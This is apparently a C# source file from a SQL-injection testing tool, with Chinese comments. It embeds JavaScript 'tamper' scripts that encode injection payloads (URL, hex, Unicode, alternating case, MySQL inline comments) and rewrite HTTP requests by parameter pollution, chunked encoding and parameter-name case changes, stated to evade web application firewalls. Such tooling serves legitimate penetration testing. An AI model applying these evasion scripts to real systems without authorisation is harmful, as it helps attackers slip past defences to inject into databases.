using System.Collections.Generic;
using SuperSQLInjectionV2.Models;

namespace SuperSQLInjectionV2.Bypass
{
    /// <summary>
    /// 内置示例脚本种子（随程序发布的 JS 参考实现）：首次加载或同名脚本缺失时写入 config/rules/scripts/
    /// 并以停用状态挂到编码链尾（RuleStore.LoadTampers 执行比对挂载）。
    /// 含工具独有能力脚本（url编码/Hex编码/交替大小写/Unicode编码/关键字内联注释，原原生C#实现的JS迁移版）
    /// 与报文级参考实现（HPP/chunked/参数名混淆），全部为可查看/可编辑/可删除的普通磁盘脚本；
    /// 删除后下次启动会重新生成（"缺失即补"策略），不想用请保持停用开关关闭。
    /// </summary>
    public static class SeedScripts
    {
        public sealed class Item
        {
            public required string Name { get; init; }
            public required ScriptUsage Usage { get; init; }
            public required string Code { get; init; }
        }

        public static IReadOnlyList<Item> All { get; } = new[]
        {
            new Item
            {
                Name = "HPP参数污染(示例)",
                Usage = ScriptUsage.RequestTransform,
                Code = HppJs
            },
            new Item
            {
                Name = "chunked分块发包(示例)",
                Usage = ScriptUsage.RequestTransform,
                Code = ChunkedJs
            },
            new Item
            {
                Name = "参数名大小写混淆(示例)",
                Usage = ScriptUsage.RequestTransform,
                Code = ParamCaseRandJs
            },
            //---- 工具独有能力（原原生C#实现的JS迁移版；//@name 与随包脚本文件头一致，缺失即补）----
            new Item
            {
                Name = "url编码",
                Usage = ScriptUsage.PayloadTransform,
                Code = UrlEncodeJs
            },
            new Item
            {
                Name = "Hex编码",
                Usage = ScriptUsage.PayloadTransform,
                Code = HexJs
            },
            new Item
            {
                Name = "交替大小写",
                Usage = ScriptUsage.PayloadTransform,
                Code = AltCaseJs
            },
            new Item
            {
                Name = "Unicode编码",
                Usage = ScriptUsage.PayloadTransform,
                Code = UnicodeJs
            },
            new Item
            {
                Name = "关键字内联注释",
                Usage = ScriptUsage.PayloadTransform,
                Code = IncludeCommentJs
            }
        };

        /// <summary>url编码：整段URL编码（特殊字符→%XX；启用后抑制Encode块的兜底URL编码）</summary>
        public const string UrlEncodeJs = """
// urlencode：整段URL编码（特殊字符→%XX；启用后抑制Encode块的兜底URL编码）
function tamper(payload){
    var keep = /[a-zA-Z0-9\-._()*'!]/;
    var out = '';
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        out += keep.test(c) ? c : encodeURIComponent(c).toLowerCase();
    }
    return out;
}
""";

        /// <summary>Hex编码：整段转十六进制串（0x前缀+UTF-8字节小写hex，MySQL可直接作字符串字面量）</summary>
        public const string HexJs = """
// hex：整段转十六进制串（0x前缀+UTF-8字节，MySQL可直接作字符串字面量）
function tamper(payload){
    var s = unescape(encodeURIComponent(payload)); // UTF-8字节流
    var out = '0x';
    for (var i = 0; i < s.length; i++){
        out += s.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return out;
}
""";

        /// <summary>交替大小写：关键字字母按位交替大小写（库名.表/@变量/引号字符串/函数调用不处理）</summary>
        public const string AltCaseJs = """
// altcase：关键字字母按位交替大小写（库名.表/@变量/引号字符串/函数调用不处理）
function altCase(key){
    var out = '';
    for (var j = 0; j < key.length; j++){
        out += j % 2 === 0 ? key.charAt(j).toUpperCase() : key.charAt(j).toLowerCase();
    }
    return out;
}
function tamper(oldStr){
    var ret = oldStr;
    try{
        var re = /([a-zA-Z_.]+|@+[a-zA-Z_]+|[a-zA-Z_]\(\)+|'[a-zA-Z_\-]+')/g;
        var m;
        while ((m = re.exec(oldStr)) !== null){
            var keyStr = m[0];
            if (keyStr.indexOf("'") >= 0 || keyStr.indexOf(".") >= 0 || keyStr.indexOf("@") >= 0 || keyStr.indexOf("()") >= 0) { continue; }
            ret = ret.split(keyStr).join(altCase(keyStr));
        }
    } catch(e){}
    return ret.split('0X').join('0x');
}
""";

        /// <summary>Unicode编码：整段字符→%uXXXX（UTF-16宽字符，ASP/IIS场景）</summary>
        public const string UnicodeJs = """
// unicode：整段字符→%uXXXX（UTF-16宽字符，ASP/IIS场景）
function tamper(payload){
    var out = '';
    for (var i = 0; i < payload.length; i++){
        out += '%u' + payload.charCodeAt(i).toString(16).padStart(4, '0');
    }
    return out;
}
""";

        /// <summary>关键字内联注释：标识符包裹MySQL内联执行注释（kw→/*!kw*/，@变量不动）</summary>
        public const string IncludeCommentJs = """
// includecomment：标识符包裹MySQL内联执行注释（kw→/*!kw*/，@变量不动）
function tamper(payload){
    return payload.replace(/[a-zA-Z_.(@]{2,50}/g, function(m){
        return m.indexOf('@') >= 0 ? m : '/*!' + m + '*/';
    });
}
""";

        /// <summary>HPP参数污染：参数值按空格拆成多个同名参数（绕过参数级WAF）；PARAM写死注入参数名，留空拆全部</summary>
        public const string HppJs = """
// 报文级：HPP参数污染（参数值按空格拆成多个同名参数，绕过参数级WAF）
// PARAM 改为你的注入参数名；留空 '' 则拆分所有参数
var PARAM = 'id';
// 拆分一段参数串（query 或 body）：值允许含原始空格（本工具报文可不编码），遇 & 或串尾即止
function hpp(text, firstPre){
    return text.replace(new RegExp('([?&]|' + firstPre + ')([^&=\\s]+)=([^&\\r\\n]*)', 'gm'), function(m, pre, name, val){
        if (PARAM && name !== PARAM) { return m; }
        var parts = val.split(/%20|\+| /).filter(function(x){ return x.length > 0; });
        if (parts.length < 2) { return m; }
        // 首段保留原前缀（?/&/串首），后续段一律用 & 连接（重复 pre 会产生非法报文）
        return parts.map(function(p, i){ return (i === 0 ? pre : '&') + name + '=' + p; }).join('');
    });
}
function tamper(request){
    var headEnd = request.indexOf('\r\n\r\n');
    var head = headEnd < 0 ? request : request.substring(0, headEnd);
    var body = headEnd < 0 ? null : request.substring(headEnd + 4);
    // 请求行只处理 URL 部分：' HTTP/' 之后是协议版本号，
    // 吞进参数值拆分会把 HTTP/1.1 拼成参数、与 URL 挤在一起丢失空格
    var nl = head.indexOf('\r\n');
    var line1 = nl < 0 ? head : head.substring(0, nl);
    var headers = nl < 0 ? '' : head.substring(nl);
    var sp = line1.lastIndexOf(' HTTP/');
    var urlPart = sp < 0 ? line1 : line1.substring(0, sp);
    var verPart = sp < 0 ? '' : line1.substring(sp);
    var outHead = hpp(urlPart, '\\?') + verPart + headers;
    if (body === null) { return outHead; }
    var outBody = hpp(body, '^');
    // body变长后收敛Content-Length
    var blen = unescape(encodeURIComponent(outBody)).length;
    if (/^Content-Length:/im.test(outHead)) {
        outHead = outHead.replace(/^Content-Length:[^\r\n]*/im, 'Content-Length: ' + blen);
    }
    return outHead + '\r\n\r\n' + outBody;
}
""";

        /// <summary>chunked分块发包：POST体按Transfer-Encoding: chunked随机分块发送（绕过长body WAF）；块长按UTF-8字节计</summary>
        public const string ChunkedJs = """
// 报文级：chunked分块发包（POST体按 Transfer-Encoding: chunked 随机分块发送，绕过长body WAF）
function tamper(request){
    var idx = request.indexOf('\r\n\r\n');
    if (idx < 0) { return request; }
    var head = request.substring(0, idx);
    var body = request.substring(idx + 4);
    if (body.length === 0) { return request; }                  // GET/无body不处理
    if (/^Transfer-Encoding:/im.test(head)) { return request; } // 已chunked不重复处理
    head = head.replace(/^Content-Length:[^\r\n]*\r?\n?/gim, '');
    head += '\r\nTransfer-Encoding: chunked';
    var out = head + '\r\n\r\n';
    var i = 0;
    while (i < body.length) {
        var n = 10 + Math.floor(Math.random() * 41);            // 10~50随机块
        var chunk = body.substr(i, n);
        i += chunk.length;
        // 块长度必须按UTF-8字节数计（多字节字符按字符计会导致服务器解帧错乱）
        var blen = unescape(encodeURIComponent(chunk)).length;
        out += blen.toString(16) + '\r\n' + chunk + '\r\n';
    }
    return out + '0\r\n\r\n';
}
""";

        /// <summary>参数名大小写混淆：参数名逐字符随机大小写（绕过按参数名精确匹配的参数级WAF）；PARAM写死注入参数名，留空混淆全部</summary>
        public const string ParamCaseRandJs = """
// 报文级：参数名大小写混淆（参数名逐字符随机大小写，绕过按参数名精确匹配的参数级WAF）
// PARAM 改为你的注入参数名（不区分大小写匹配）；留空 '' 则混淆所有参数名
var PARAM = '';
function tamper(request){
    return request.replace(/([?&\n])([^&=\s]+)=/g, function(m, pre, name){
        if (PARAM && name.toLowerCase() !== PARAM.toLowerCase()) { return m; }
        var out = '';
        for (var i = 0; i < name.length; i++) {
            var c = name.charAt(i);
            out += Math.random() < 0.5 ? c.toLowerCase() : c.toUpperCase();
        }
        return pre + out + '=';
    });
}
""";
    }
}
